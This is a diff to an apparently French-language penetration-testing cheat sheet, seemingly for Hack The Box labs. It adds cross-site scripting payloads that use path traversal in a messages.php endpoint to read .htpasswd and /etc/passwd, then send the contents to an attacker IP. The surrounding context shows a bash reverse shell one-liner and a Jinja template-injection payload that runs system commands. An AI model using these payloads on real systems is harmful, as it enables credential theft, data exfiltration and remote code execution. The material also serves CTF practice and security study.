@@ -79,6 +79,32 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
         });
 	</script>
     ```
+
+    - Pour récupérer un fichier :
+     ```javascript=
+    <script>
+	fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+	  .then(response => response.text())
+	  .then(data => {
+	    fetch("http://10.10.14.66:9001/?file_content=" + encodeURIComponent(data));
+	  });
+    </script>
+    ```
+     ou
+  ```javascript=
+    <script>
+    var url = "messages.php?file=../../../../../../../etc/passwd"
+    var attacker = "http://10.10.14.66:9001/exfil"
+    var xhr = new XMLHttpRequest()
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+      }
+    }
+    xhr.open("GET", url, true)
+    xhr.send(null)
+  </script>
+  ```
  
 - Jinga :
   	- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` --> payload id
